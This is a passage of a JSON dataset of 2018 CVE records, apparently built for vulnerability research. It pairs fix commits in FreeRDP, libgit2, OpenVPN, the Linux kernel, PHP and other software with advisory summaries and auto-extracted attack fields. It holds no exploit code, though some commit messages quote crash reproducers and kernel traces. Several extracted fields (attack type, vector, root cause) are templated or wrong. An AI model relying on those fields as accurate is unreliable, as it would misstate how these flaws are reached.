read","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"a1098f81c252b317ad34ea978aea2bc47760b215","cve_id":"CVE-2018-9988","cwe_id":"CWE-119","commit_message":"Add bounds check before signature length read","summary":"ARM mbed TLS before 2.1.11, before 2.7.2, and before 2.8.0 has a buffer over-read in ssl_parse_server_key_exchange() that could cause a crash on invalid input.","commit_message_1":"add bound check before signature length read","Vulnerability Type":"buffer overflow","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"b4d6cf6836ce025ba1811b7bbec52680c7204223","cve_id":"CVE-2018-9918","cwe_id":"CWE-674","commit_message":"Limit depth of nesting in direct objects (fixes #202)\n\nThis fixes CVE-2018-9918.","summary":"libqpdf.a in QPDF through 8.0.2 mishandles certain *expected dictionary key but found non-name object* cases, allowing remote attackers to cause a denial of service (stack exhaustion), related to the QPDFObjectHandle and QPDF_Dictionary classes, because nesting in direct objects is not restricted.","commit_message_1":"limit depth of nesting in direct object ( fix # <number> ) this fix <cve_id>","Vulnerability Type":"Uncontrolled Recursion","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"1394192b210cb3c6624a7419bcf3ff966742e79b","cve_id":"CVE-2018-9336","cwe_id":"CWE-415","commit_message":"Fix potential double-free() in Interactive Service (CVE-2018-9336)\n\nMalformed input data on the service pipe towards the OpenVPN interactive\nservice (normally used by the OpenVPN GUI to request openvpn instances\nfrom the service) can result in a double free() in the error handling code.\n\nThis usually only leads to a process crash (DoS by an unprivileged local\naccount) but since it could possibly lead to memory corruption if\nhappening while multiple other threads are active at the same time,\nCVE-2018-9336 has been assigned to acknowledge this risk.\n\nFix by ensuring that sud->directory is set to NULL in GetStartUpData()\nfor all error cases (thus not being free()ed in FreeStartupData()).\n\nRewrite control flow to use explicit error label for error exit.\n\nDiscovered and reported by Jacob Baines <jbaines@tenable.com>.\n\nCVE: 2018-9336\n\nSigned-off-by: Gert Doering <gert@greenie.muc.de>\nAcked-by: Selva Nair <selva.nair@gmail.com>\nMessage-Id: <20180414072617.25075-1-gert@greenie.muc.de>\nURL: https:\/\/www.mail-archive.com\/search?l=mid&q=20180414072617.25075-1-gert@greenie.muc.de\n\nSigned-off-by: Gert Doering <gert@greenie.muc.de>","summary":"openvpnserv.exe (aka the interactive service helper) in OpenVPN 2.4.x before 2.4.6 allows a local attacker to cause a double-free of memory by sending a malformed request to the interactive service. This could cause a denial-of-service through memory corruption or possibly have unspecified other impact including privilege escalation.","commit_message_1":"fix potential double-free ( ) in interactive service ( <cve_id> ) malformed input data on the service pipe towards the openvpn interactive service ( normally used by the openvpn gui to request openvpn instance from the service ) can result in a double free ( ) in the error handling code","Vulnerability Type":"double free","Attack Vector":"by sending a malformed request to the interactive service","Impact":"cause a denial of service","Root Cause":"caused by a double free","Attack Type":"local attacker"},{"commit_id":"0f6ceabab0a8849b47f67d727aa526c2656089ba","cve_id":"CVE-2018-9275","cwe_id":"CWE-200","commit_message":"util: make sure to close the authfile before returning success\n\nfixes #136","summary":"In check_user_token in util.c in the Yubico PAM module (aka pam_yubico) 2.18 through 2.25, successful logins can leak file descriptors to the auth mapping file, which can lead to information disclosure (serial number of a device) and\/or DoS (reaching the maximum number of file descriptors).","commit_message_1":"make sure to close the authfile before returning success fix # <number>","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"By sending a specially-crafted request","Impact":"obtain sensitive information","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"0654414afcce51a16d35d05060190a3ec4618d42","cve_id":"CVE-2018-8970","cwe_id":"CWE-295","commit_message":"Call strlen() if name length provided is 0, like OpenSSL does.\nIssue notice by Christian Heimes <christian@python.org>\nok deraadt@ jsing@","summary":"The int_x509_param_set_hosts function in lib\/libcrypto\/x509\/x509_vpm.c in LibreSSL 2.7.0 before 2.7.1 does not support a certain special case of a zero name length, which causes silent omission of hostname verification, and consequently allows man-in-the-middle attackers to spoof servers and obtain sensitive information via a crafted certificate. NOTE: the LibreSSL documentation indicates that this special case is supported, but the BoringSSL documentation does not.","commit_message_1":"call strlen ( ) if name length provided is <number> , like openssl doe","Vulnerability Type":"Improper Certificate Validation","Attack Vector":"By using a specially-crafted certificates","Impact":"spoof servers and obtain sensitive information","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"d8ba61ba58c88d5207c1ba2f7d9a2280e7d03be9","cve_id":"CVE-2018-8897","cwe_id":"CWE-362","commit_message":"x86\/entry\/64: Don't use IST entry for #BP stack\n\nThere's nothing IST-worthy about #BP\/int3.  We don't allow kprobes\nin the small handful of places in the kernel that run at CPL0 with\nan invalid stack, and 32-bit kernels have used normal interrupt\ngates for #BP forever.\n\nFurthermore, we don't allow kprobes in places that have usergs while\nin kernel mode, so \"paranoid\" is also unnecessary.\n\nSigned-off-by: Andy Lutomirski <luto@kernel.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\nSigned-off-by: Thomas Gleixner <tglx@linutronix.de>\nCc: stable@vger.kernel.org","summary":"A statement in the System Programming Guide of the Intel 64 and IA-32 Architectures Software Developer's Manual (SDM) was mishandled in the development of some or all operating-system kernels, resulting in unexpected behavior for #DB exceptions that are deferred by MOV SS or POP SS, as demonstrated by (for example) privilege escalation in Windows, macOS, some Xen configurations, or FreeBSD, or a Linux kernel crash. The MOV to SS and POP SS instructions inhibit interrupts (including NMIs), data breakpoints, and single step trap exceptions until the instruction boundary following the next instruction (SDM Vol. 3A; section 6.8.3). (The inhibited data breakpoints are those on memory accessed by the MOV to SS or POP to SS instruction itself.) Note that debug exceptions are not inhibited by the interrupt enable (EFLAGS.IF) system flag (SDM Vol. 3A; section 2.3). If the instruction following the MOV to SS or POP to SS instruction is an instruction like SYSCALL, SYSENTER, INT 3, etc. that transfers control to the operating system at CPL < 3, the debug exception is delivered after the transfer to CPL < 3 is complete. OS kernels may not expect this order of events and may therefore experience unexpected behavior when it occurs.","commit_message_1":"do n't use ist entry for # bp stack there 's nothing ist-worthy about # bp\/int3","Vulnerability Type":"Race Condition","Attack Vector":"using operating system APIs","Impact":"gain elevated privileges","Root Cause":"caused by developer interpretation of hardware debug exception documentation for the MOV to SS and POP SS instructions","Attack Type":"local attacker"},{"commit_id":"e1d8008a09d9390ebaf698abe8909e10dfec4097","cve_id":"CVE-2018-8828","cwe_id":"CWE-119","commit_message":"tmx: allocate space to store ending 0 for branch value\n\n- reported by Alfred Farrugia and Sandro Gauci","summary":"A Buffer Overflow issue was discovered in Kamailio before 4.4.7, 5.0.x before 5.0.6, and 5.1.x before 5.1.2. A specially crafted REGISTER message with a malformed branch or From tag triggers an off-by-one heap-based buffer overflow in the tmx_check_pretran function in modules\/tmx\/tmx_pretran.c.","commit_message_1":"allocate space to store ending <number> for branch value - reported by alfred farrugia and sandro gauci","Vulnerability Type":"buffer overflow","Attack Vector":"By sending a specially crafted REGISTER message with a malformed `branch` or `From tag`","Impact":"cause a denial of service","Root Cause":"caused by an off-by-one heap-based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"2ee663f39dc8dac3d9988e847db19b2d7e3ac8c6","cve_id":"CVE-2018-8789","cwe_id":"CWE-125","commit_message":"Fixed CVE-2018-8789\n\nThanks to Eyal Itkin from Check Point Software Technologies.","summary":"FreeRDP prior to version 2.0.0-rc4 contains several Out-Of-Bounds Reads in the NTLM Authentication module that results in a Denial of Service (segfault).","commit_message_1":"fixed <cve_id> thanks to eyal itkin from check point software technology","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By persuading a victim to connect to a malicious RDP server","Impact":"cause a denial of service","Root Cause":"caused by multiple out-of-bounds reads","Attack Type":"remote attacker"},{"commit_id":"d1112c279bd1a327e8e4d0b5f371458bf2579659","cve_id":"CVE-2018-8788","cwe_id":"CWE-787","commit_message":"Fixed CVE-2018-8788\n\nThanks to Eyal Itkin from Check Point Software Technologies.","summary":"FreeRDP prior to version 2.0.0-rc4 contains an Out-Of-Bounds Write of up to 4 bytes in function nsc_rle_decode() that results in a memory corruption and possibly even a remote code execution.","commit_message_1":"fixed <cve_id> thanks to eyal itkin from check point software technology","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"By persuading a victim to connect to a malicious RDP server","Impact":"execute arbitrary code","Root Cause":"caused by an out-of-bounds write","Attack Type":"remote attacker"},{"commit_id":"09b9d4f1994a674c4ec85b4947aa656eda1aed8a","cve_id":"CVE-2018-8787","cwe_id":"CWE-190","commit_message":"Fixed CVE-2018-8787\n\nThanks to Eyal Itkin from Check Point Software Technologies.","summary":"FreeRDP prior to version 2.0.0-rc4 contains an Integer Overflow that leads to a Heap-Based Buffer Overflow in function gdi_Bitmap_Decompress() and results in a memory corruption and probably even a remote code execution.","commit_message_1":"fixed <cve_id> thanks to eyal itkin from check point software technology","Vulnerability Type":"integer overflow","Attack Vector":"By persuading a victim to connect to a malicious RDP server","Impact":"overflow a buffer and execute arbitrary code on the system","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"445a5a42c500ceb80f8fa7f2c11f3682538033f3","cve_id":"CVE-2018-8786","cwe_id":"CWE-119","commit_message":"Fixed CVE-2018-8786\n\nThanks to Eyal Itkin from Check Point Software Technologies.","summary":"FreeRDP prior to version 2.0.0-rc4 contains an Integer Truncation that leads to a Heap-Based Buffer Overflow in function update_read_bitmap_update() and results in a memory corruption and probably even a remote code execution.","commit_message_1":"fixed <cve_id> thanks to eyal itkin from check point software technology","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to connect to a malicious RDP server","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"contains an integer truncation that leads to a heap - based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"602f4a2e14b41703b5f431de3154cd46a5750a2d","cve_id":"CVE-2018-8785","cwe_id":"CWE-119","commit_message":"Fixed CVE-2018-8785\n\nThanks to Eyal Itkin from Check Point Software Technologies.","summary":"FreeRDP prior to version 2.0.0-rc4 contains a Heap-Based Buffer Overflow in function zgfx_decompress() that results in a memory corruption and probably even a remote code execution.","commit_message_1":"fixed <cve_id> thanks to eyal itkin from check point software technology","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to connect to a malicious RDP server","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"caused by improper bounds checking by the zgfx_decompress() function","Attack Type":"remote attacker"},{"commit_id":"17c363a5162fd4dc77b1df54e48d7bd9bf6b3be7","cve_id":"CVE-2018-8784","cwe_id":"CWE-119","commit_message":"Fixed CVE-2018-8784\n\nThanks to Eyal Itkin from Check Point Software Technologies.","summary":"FreeRDP prior to version 2.0.0-rc4 contains a Heap-Based Buffer Overflow in function zgfx_decompress_segment() that results in a memory corruption and probably even a remote code execution.","commit_message_1":"fixed <cve_id> thanks to eyal itkin from check point software technology","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to connect to a malicious RDP server","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"caused by improper bounds checking by the zgfx_decompress_segment() function","Attack Type":"remote attacker"},{"commit_id":"444ca3ce7853538c577e0ec3f6146d2d65780734","cve_id":"CVE-2018-8754","cwe_id":"CWE-125","commit_message":"Applied updates and addition boundary checks for corrupted data","summary":"** DISPUTED ** The libevt_record_values_read_event() function in libevt_record_values.c in libevt before 2018-03-17 does not properly check for out-of-bounds values of user SID data size, strings size, or data size. NOTE: the vendor has disputed this as described in libyal\/libevt issue 5 on GitHub.","commit_message_1":"applied update and addition boundary check for corrupted data","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"The libevt_record_values_read_event() function in libevt_record_values.c in libevt","Impact":"execute arbitrary code","Root Cause":"does not properly check for out - of - bounds values of user sid data size , strings size , or data size","Attack Type":"remote attacker"},{"commit_id":"58a6fe94cb851f71214dbefac3f9bffee437d6fe","cve_id":"CVE-2018-8099","cwe_id":"CWE-415","commit_message":"index: convert `read_entry` to return entry size via an out-param\n\nThe function `read_entry` does not conform to our usual coding style of\nreturning stuff via the out parameter and to use the return value for\nreporting errors. Due to most of our code conforming to that pattern, it\nhas become quite natural for us to actually return `-1` in case there is\nany error, which has also slipped in with commit 5625d86b9 (index:\nsupport index v4, 2016-05-17). As the function returns an `size_t` only,\nthough, the return value is wrapped around, causing the caller of\n`read_tree` to continue with an invalid index entry. Ultimately, this\ncan lead to a double-free.\n\nImprove code and fix the bug by converting the function to return the\nindex entry size via an out parameter and only using the return value to\nindicate errors.\n\nReported-by: Krishna Ram Prakash R <krp@gtux.in>\nReported-by: Vivek Parikh <viv0411.parikh@gmail.com>","summary":"Incorrect returning of an error code in the index.c:read_entry() function leads to a double free in libgit2 before v0.26.2, which allows an attacker to cause a denial of service via a crafted repository index file.","commit_message_1":"convert ` read_entry ` to return entry size via an out-param the function ` read_entry ` doe not conform to our usual coding style of returning stuff via the out parameter and to use the return value for reporting error","Vulnerability Type":"double free","Attack Vector":"via a crafted repository index file","Impact":"cause a denial of service","Root Cause":"caused by a double free","Attack Type":"remote attacker"},{"commit_id":"3207ddb0103543da8ad2139ec6539f590f9900c1","cve_id":"CVE-2018-8098","cwe_id":"CWE-190","commit_message":"index: fix out-of-bounds read with invalid index entry prefix length\n\nThe index format in version 4 has prefix-compressed entries, where every\nindex entry can compress its path by using a path prefix of the previous\nentry. Since implmenting support for this index format version in commit\n5625d86b9 (index: support index v4, 2016-05-17), though, we do not\ncorrectly verify that the prefix length that we want to reuse is\nactually smaller or equal to the amount of characters than the length of\nthe previous index entry's path. This can lead to a an integer underflow\nand subsequently to an out-of-bounds read.\n\nFix this by verifying that the prefix is actually smaller than the\nprevious entry's path length.\n\nReported-by: Krishna Ram Prakash R <krp@gtux.in>\nReported-by: Vivek Parikh <viv0411.parikh@gmail.com>","summary":"Integer overflow in the index.c:read_entry() function while decompressing a compressed prefix length in libgit2 before v0.26.2 allows an attacker to cause a denial of service (out-of-bounds read) via a crafted repository index file.","commit_message_1":"fix out-of-bounds read with invalid index entry prefix length the index format in version <number> ha prefix-compressed entry , where every index entry can compress it path by using a path prefix of the previous entry","Vulnerability Type":"integer overflow","Attack Vector":"via a crafted repository index file ","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"0ddcff49b672239dda94d70d0fcf50317a9f4b51","cve_id":"CVE-2018-8087","cwe_id":"CWE-772","commit_message":"mac80211_hwsim: fix possible memory leak in hwsim_new_radio_nl()\n\n'hwname' is malloced in hwsim_new_radio_nl() and should be freed\nbefore leaving from the error handling cases, otherwise it will cause\nmemory leak.\n\nFixes: ff4dd73dd2b4 (\"mac80211_hwsim: check HWSIM_ATTR_RADIO_NAME length\")\nSigned-off-by: Wei Yongjun <weiyongjun1@huawei.com>\nReviewed-by: Ben Hutchings <ben.hutchings@codethink.co.uk>\nSigned-off-by: Johannes Berg <johannes.berg@intel.com>","summary":"Memory leak in the hwsim_new_radio_nl function in drivers\/net\/wireless\/mac80211_hwsim.c in the Linux kernel through 4.15.9 allows local users to cause a denial of service (memory consumption) by triggering an out-of-array error case.","commit_message_1":"fix possible memory leak in hwsim_new_radio_nl ( ) 'hwname ' is malloced in hwsim_new_radio_nl ( ) and should be freed before leaving from the error handling case , otherwise it will cause memory leak","Vulnerability Type":"memory leak","Attack Vector":"by triggering an out - of - array error case .","Impact":"cause a denial of service","Root Cause":"caused by a memory leak","Attack Type":"local attacker"},{"commit_id":"435a2ca802358a3debb6d164d2c33049131df81c","cve_id":"CVE-2018-8050","cwe_id":"CWE-20","commit_message":"Sanity check size passed to malloc...\n\nAdd sanity check before calling malloc in af_get_page() function to\navoid undefined behavior (e.g., seg fault) when dealing with a corrupt\nAFF image with an invalid pagesize.\n\nIssue found by Luis Rocha (luiscrocha@gmail.com).","summary":"The af_get_page() function in lib\/afflib_pages.cpp in AFFLIB (aka AFFLIBv3) through 3.7.16 allows remote attackers to cause a denial of service (segmentation fault) via a corrupt AFF image that triggers an unexpected pagesize value.","commit_message_1":"sanity check size passed to malloc","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a corrupt aff image that triggers an unexpected pagesize value","Impact":"cause a denial of service ( segmentation fault )","Root Cause":"caused by a segmentation fault","Attack Type":"remote attacker"},{"commit_id":"297a6961ffb8ff4dc66c9fbf53b924bd1dda05d5","cve_id":"CVE-2018-8043","cwe_id":"CWE-476","commit_message":"net: phy: mdio-bcm-unimac: fix potential NULL dereference in unimac_mdio_probe()\n\nplatform_get_resource() may fail and return NULL, so we should\nbetter check it's return value to avoid a NULL pointer dereference\na bit later in the code.\n\nThis is detected by Coccinelle semantic patch.\n\n@@\nexpression pdev, res, n, t, e, e1, e2;\n@@\n\nres = platform_get_resource(pdev, t, n);\n+ if (!res)\n+   return -EINVAL;\n... when != res == NULL\ne = devm_ioremap(e1, res->start, e2);\n\nSigned-off-by: Wei Yongjun <weiyongjun1@huawei.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The unimac_mdio_probe function in drivers\/net\/phy\/mdio-bcm-unimac.c in the Linux kernel through 4.15.8 does not validate certain resource availability, which allows local users to cause a denial of service (NULL pointer dereference).","commit_message_1":"phy : mdio-bcm-unimac : fix potential null dereference in unimac_mdio_probe ( ) platform_get_resource ( ) may fail and return null , so we should better check it 's return value to avoid a null pointer dereference a bit later in the code","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"unimac_mdio_probe function in drivers\/net\/phy\/mdio-bcm-unimac.c","Impact":"cause a denial of service ( pointer dereference )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"db132b4731a9b4c9534144ba3a18e65b390e9ff6","cve_id":"CVE-2018-7999","cwe_id":"CWE-476","commit_message":"Deprecate and make ineffective gr_face_dumbRendering","summary":"In libgraphite2 in graphite2 1.3.11, a NULL pointer dereference vulnerability was found in Segment.cpp during a dumbRendering operation, which may allow attackers to cause a denial of service or possibly have unspecified other impact via a crafted .ttf file.","commit_message_1":"deprecate and make ineffective gr_face_dumbrendering","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via a crafted . ttf file","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"20d840e6da15c1574b3ed998bc92f91d1e36c2a5","cve_id":"CVE-2018-7998","cwe_id":"CWE-362","commit_message":"fix a crash with delayed load\n\nIf a delayed load failed, it could leave the pipeline only half-set up.\nSebsequent threads could then segv.\n\nSet a load-has-failed flag and test before generate.\n\nSee https:\/\/github.com\/jcupitt\/libvips\/issues\/893","summary":"In libvips before 8.6.3, a NULL function pointer dereference vulnerability was found in the vips_region_generate function in region.c, which allows remote attackers to cause a denial of service or possibly have unspecified other impact via a crafted image file. This occurs because of a race condition involving a failed delayed load and other worker threads.","commit_message_1":"fix a crash with delayed load if a delayed load failed , it could leave the pipeline only half-set up","Vulnerability Type":"Race Condition","Attack Vector":"via a crafted image file","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a NULL function pointer dereference","Attack Type":"remote attacker"},{"commit_id":"4a491b1ab11ca0556d2fda1ff1301e862a2d44c4","cve_id":"CVE-2018-7757","cwe_id":"CWE-772","commit_message":"scsi: libsas: fix memory leak in sas_smp_get_phy_events()\n\nWe've got a memory leak with the following producer:\n\nwhile true;\ndo cat \/sys\/class\/sas_phy\/phy-1:0:12\/invalid_dword_count >\/dev\/null;\ndone\n\nThe buffer req is allocated and not freed after we return. Fix it.\n\nFixes: 2908d778ab3e (\"[SCSI] aic94xx: new driver\")\nSigned-off-by: Jason Yan <yanaijie@huawei.com>\nCC: John Garry <john.garry@huawei.com>\nCC: chenqilin <chenqilin2@huawei.com>\nCC: chenxiang <chenxiang66@hisilicon.com>\nReviewed-by: Christoph Hellwig <hch@lst.de>\nReviewed-by: Hannes Reinecke <hare@suse.com>\nSigned-off-by: Martin K. Petersen <martin.petersen@oracle.com>","summary":"Memory leak in the sas_smp_get_phy_events function in drivers\/scsi\/libsas\/sas_expander.c in the Linux kernel through 4.15.7 allows local users to cause a denial of service (memory consumption) via many read accesses to files in the \/sys\/class\/sas_phy directory, as demonstrated by the \/sys\/class\/sas_phy\/phy-1:0:12\/invalid_dword_count file.","commit_message_1":"libsas : fix memory leak in sas_smp_get_phy_events ( ) we 've got a memory leak with the following producer : while true ; do cat \/sys\/class\/sas_phy\/phy-<number> : <number> : <number>\/invalid_dword_count > \/dev\/null ; done the buffer req is allocated and not freed after we return","Vulnerability Type":"memory leak","Attack Vector":"via many read accesses to files in the \/ sys \/ class \/ sas _ phy directory , as demonstrated by the \/ sys \/ class \/ sas _ phy \/ phy - 1 : 0 : 12 \/ invalid _ dword _ count file","Impact":"cause a denial of service","Root Cause":"caused by a memory leak","Attack Type":"local attacker"},{"commit_id":"90dc7f853d31b0a4e9441cba97feccf36d8b69a4","cve_id":"CVE-2018-7752","cwe_id":"CWE-119","commit_message":"fix some exploitable overflows (#994, #997)","summary":"GPAC through 0.7.1 has a Buffer Overflow in the gf_media_avc_read_sps function in media_tools\/av_parsers.c, a different vulnerability than CVE-2018-1000100.","commit_message_1":"fix some exploitable overflow ( # <number> , # <number> )","Vulnerability Type":"buffer overflow","Attack Vector":"By sending a specially-crafted request","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"caused by improper bounds checking by the gf_media_avc_read_sps function","Attack Type":"remote attacker"},{"commit_id":"6d8c0c06ee32dc03ba80acd48334e98728e56cf5","cve_id":"CVE-2018-7648","cwe_id":"CWE-119","commit_message":"opj_mj2_extract: Check provided output prefix for length\n\nThis uses snprintf() with correct buffer length instead of sprintf(). This\nprevents a buffer overflow when providing a long output prefix. Furthermore\nthe program exits with an error when the provided output prefix is too long.\n\nFixes #1088.","summary":"An issue was discovered in mj2\/opj_mj2_extract.c in OpenJPEG 2.3.0. The output prefix was not checked for length, which could overflow a buffer, when providing a prefix with 50 or more characters on the command line.","commit_message_1":"check provided output prefix for length this us snprintf ( ) with correct buffer length instead of sprintf ( )","Vulnerability Type":"buffer overflow","Attack Vector":"By using a specially-crafted command line","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"caused by improper bounds checking by mj2\/opj_mj2_extract.c","Attack Type":"remote attacker"},{"commit_id":"523f230c831d7b33353203fa34aee4e92ac12bba","cve_id":"CVE-2018-7584","cwe_id":"CWE-119","commit_message":"Fix bug #75981: prevent reading beyond buffer start","summary":"In PHP through 5.6.33, 7.0.x before 7.0.28, 7.1.x through 7.1.14, and 7.2.x through 7.2.2, there is a stack-based buffer under-read while parsing an HTTP response in the php_stream_url_wrap_http_ex function in ext\/standard\/http_fopen_wrapper.c. This subsequently results in copying a large string.","commit_message_1":"fix bug # <number> : prevent reading beyond buffer start","Vulnerability Type":"buffer overflow","Attack Vector":"By sending a specially-crafted request","Impact":"overflow a buffer and execute arbitrary code on the system or cause a denial of service","Root Cause":"caused by improper bounds checking by the php_stream_url_wrap_http_ex function","Attack Type":"remote attacker"},{"commit_id":"f3069c6d33f6ae63a1668737bc78aaaa51bff7ca","cve_id":"CVE-2018-7492","cwe_id":"CWE-476","commit_message":"rds: Fix NULL pointer dereference in __rds_rdma_map\n\nThis is a fix for syzkaller719569, where memory registration was\nattempted without any underlying transport being loaded.\n\nAnalysis of the case reveals that it is the setsockopt() RDS_GET_MR\n(2) and RDS_GET_MR_FOR_DEST (7) that are vulnerable.\n\nHere is an example stack trace when the bug is hit:\n\nBUG: unable to handle kernel NULL pointer dereference at 00000000000000c0\nIP: __rds_rdma_map+0x36\/0x440 [rds]\nPGD 2f93d03067 P4D 2f93d03067 PUD 2f93d02067 PMD 0\nOops: 0000 [#1] SMP\nModules linked in: bridge stp llc tun rpcsec_gss_krb5 nfsv4\ndns_resolver nfs fscache rds binfmt_misc sb_edac intel_powerclamp\ncoretemp kvm_intel kvm irqbypass crct10dif_pclmul c rc32_pclmul\nghash_clmulni_intel pcbc aesni_intel crypto_simd glue_helper cryptd\niTCO_wdt mei_me sg iTCO_vendor_support ipmi_si mei ipmi_devintf nfsd\nshpchp pcspkr i2c_i801 ioatd ma ipmi_msghandler wmi lpc_ich mfd_core\nauth_rpcgss nfs_acl lockd grace sunrpc ip_tables ext4 mbcache jbd2\nmgag200 i2c_algo_bit drm_kms_helper ixgbe syscopyarea ahci sysfillrect\nsysimgblt libahci mdio fb_sys_fops ttm ptp libata sd_mod mlx4_core drm\ncrc32c_intel pps_core megaraid_sas i2c_core dca dm_mirror\ndm_region_hash dm_log dm_mod\nCPU: 48 PID: 45787 Comm: repro_set2 Not tainted 4.14.2-3.el7uek.x86_64 #2\nHardware name: Oracle Corporation ORACLE SERVER X5-2L\/ASM,MOBO TRAY,2U, BIOS 31110000 03\/03\/2017\ntask: ffff882f9190db00 task.stack: ffffc9002b994000\nRIP: 0010:__rds_rdma_map+0x36\/0x440 [rds]\nRSP: 0018:ffffc9002b997df0 EFLAGS: 00010202\nRAX: 0000000000000000 RBX: ffff882fa2182580 RCX: 0000000000000000\nRDX: 0000000000000000 RSI: ffffc9002b997e40 RDI: ffff882fa2182580\nRBP: ffffc9002b997e30 R08: 0000000000000000 R09: 0000000000000002\nR10: ffff885fb29e3838 R11: 0000000000000000 R12: ffff882fa2182580\nR13: ffff882fa2182580 R14: 0000000000000002 R15: 0000000020000ffc\nFS:  00007fbffa20b700(0000) GS:ffff882fbfb80000(0000) knlGS:0000000000000000\nCS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\nCR2: 00000000000000c0 CR3: 0000002f98a66006 CR4: 00000000001606e0\nCall Trace:\n rds_get_mr+0x56\/0x80 [rds]\n rds_setsockopt+0x172\/0x340 [rds]\n ? __fget_light+0x25\/0x60\n ? __fdget+0x13\/0x20\n SyS_setsockopt+0x80\/0xe0\n do_syscall_64+0x67\/0x1b0\n entry_SYSCALL64_slow_path+0x25\/0x25\nRIP: 0033:0x7fbff9b117f9\nRSP: 002b:00007fbffa20aed8 EFLAGS: 00000293 ORIG_RAX: 0000000000000036\nRAX: ffffffffffffffda RBX: 00000000000c84a4 RCX: 00007fbff9b117f9\nRDX: 0000000000000002 RSI: 0000400000000114 RDI: 000000000000109b\nRBP: 00007fbffa20af10 R08: 0000000000000020 R09: 00007fbff9dd7860\nR10: 0000000020000ffc R11: 0000000000000293 R12: 0000000000000000\nR13: 00007fbffa20b9c0 R14: 00007fbffa20b700 R15: 0000000000000021\n\nCode: 41 56 41 55 49 89 fd 41 54 53 48 83 ec 18 8b 87 f0 02 00 00 48\n89 55 d0 48 89 4d c8 85 c0 0f 84 2d 03 00 00 48 8b 87 00 03 00 00 <48>\n83 b8 c0 00 00 00 00 0f 84 25 03 00 0 0 48 8b 06 48 8b 56 08\n\nThe fix is to check the existence of an underlying transport in\n__rds_rdma_map().\n\nSigned-off-by: H\u00e5kon Bugge <haakon.bugge@oracle.com>\nReported-by: syzbot <syzkaller@googlegroups.com>\nAcked-by: Santosh Shilimkar <santosh.shilimkar@oracle.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"A NULL pointer dereference was found in the net\/rds\/rdma.c __rds_rdma_map() function in the Linux kernel before 4.14.7 allowing local attackers to cause a system panic and a denial-of-service, related to RDS_GET_MR and RDS_GET_MR_FOR_DEST.","commit_message_1":"fix null pointer dereference in __rds_rdma_map this is a fix for syzkaller719569 , where memory registration wa attempted without any underlying transport being loaded","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"related to RDS_GET_MR and RDS_GET_MR_FOR_DEST","Impact":"cause a system panic and a denial - of - service , related to rds _ get _ mr and rds _ get _ mr _ for _ dest","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"45ef78e037f578b15fc58938a3a3251655e71d6f#diff-d52750c7ba4e594410438569d8e2963aL24","cve_id":"CVE-2018-7485","cwe_id":"CWE-119","commit_message":"New Pre Source","summary":"The SQLWriteFileDSN function in odbcinst\/SQLWriteFileDSN.c in unixODBC 2.3.5 has strncpy arguments in the wrong order, which allows attackers to cause a denial of service or possibly have unspecified other impact.","commit_message_1":"new pre source","Vulnerability Type":"buffer overflow","Attack Vector":"The SQLWriteFileDSN function in odbcinst\/SQLWriteFileDSN.c","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"has strncpy arguments","Attack Type":"remote attacker"},{"commit_id":"9b54d816e00425c3a517514e0d677bb3cec49258","cve_id":"CVE-2018-7480","cwe_id":"CWE-415","commit_message":"blkcg: fix double free of new_blkg in blkcg_init_queue\n\nIf blkg_create fails, new_blkg passed as an argument will\nbe freed by blkg_create, so there is no need to free it again.\n\nSigned-off-by: Hou Tao <houtao1@huawei.com>\nSigned-off-by: Jens Axboe <axboe@fb.com>","summary":"The blkcg_init_queue function in block\/blk-cgroup.c in the Linux kernel before 4.11 allows local users to cause a denial of service (double free) or possibly have unspecified other impact by triggering a creation failure.","commit_message_1":"fix double free of new_blkg in blkcg_init_queue if blkg_create fails , new_blkg passed a an argument will be freed by blkg_create , so there is no need to free it again","Vulnerability Type":"double free","Attack Vector":"by triggering a creation failure","Impact":"cause a denial of service","Root Cause":"caused by a double free","Attack Type":"local attacker"},{"commit_id":"8e3fe45a7bac31d9a3b558ae0079e2d92a04799e","cve_id":"CVE-2018-7254","cwe_id":"CWE-125","commit_message":"issue #28, fix buffer overflows and bad allocs on corrupt CAF files","summary":"The ParseCaffHeaderConfig function of the cli\/caff.c file of WavPack 5.1.0 allows a remote attacker to cause a denial-of-service (global buffer over-read), or possibly trigger a buffer overflow or incorrect memory allocation, via a maliciously crafted 